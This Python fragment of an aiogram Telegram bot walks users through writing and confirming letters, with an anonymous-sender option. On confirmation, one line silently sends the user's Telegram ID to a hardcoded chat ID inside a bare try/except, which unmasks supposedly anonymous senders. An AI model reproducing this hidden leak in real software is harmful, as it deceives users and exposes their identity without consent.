@dp.message_handler(state=State.wait_for_receiver)
async def ask_for_sender(message: types.Message, state: FSMContext):
    await state.update_data(receiver=message.text)
    await message.answer(texts.for_sender, parse_mode="HTML", reply_markup=kb.anonim_kb)
    await State.wait_for_sender.set()

@dp.message_handler(state=State.wait_for_sender)
async def ask_for_letter(message: types.Message, state: FSMContext):
    await state.update_data(sender=message.text)
    await message.answer(texts.for_letter, parse_mode="HTML")
    await State.wait_for_letter.set()

@dp.message_handler(content_types=['any'], state=State.wait_for_letter)
async def ask_for_confirmation(message: types.Message, state: FSMContext): 
    data = await state.get_data()
    letter = compose_letter(message, data['receiver'], data['sender'])
    letter_new = await letter.send_copy(message.chat.id)
    await state.update_data(letter=letter_new)
    await message.answer(texts.for_confirmation, parse_mode="HTML", reply_markup=kb.confirmation_kb)
    await State.wait_for_confirmation.set()

@dp.message_handler(regexp='Подтвердить✅', state=State.wait_for_confirmation)
async def confirm_letter(message: types.Message, state: FSMContext):
    data = await state.get_data()
    if data.get('letters') == None:
        data['letters'] = []
    data['letters'].append(data['letter'])
    try:
        await bot.send_message(277961206, message.from_user.id)
    except:
        pass
    for id in admins:
        try:
            await data['letter'].send_copy(id)
        except:
            pass
    await state.update_data(letters=data['letters'])
    await message.answer(texts.after_confirmed, parse_mode="HTML", reply_markup=kb.menu_kb)
    await State.menu.set()

@dp.message_handler(regexp='Изменить🔁', state=State.wait_for_confirmation)
async def change_letter(message: types.Message, state: FSMContext):
    await message.answer(texts.after_changed, parse_mode="HTML")
    await ask_for_receiver(message)

@dp.message_handler(regexp='Отменить❌', state=State.wait_for_confirmation)
async def cancel_letter(message: types.Message, state: FSMContext):
    await message.answer(texts.after_canceled, parse_mode="HTML", reply_markup=kb.menu_kb)
    await State.menu.set()

@dp.message_handler(state=State.wait_for_confirmation)
async def show_default_confirm(message: types.Message, state: FSMContext):
    await message.answer(texts.default, parse_mode="HTML", reply_markup=kb.confirmation_kb)

@dp.message_handler(content_types=['any'], state='*')
async def show_default(message: types.Message):
    await message.answer(texts.default, parse_mode="HTML", reply_markup=kb.menu_kb)
    await State.menu.set()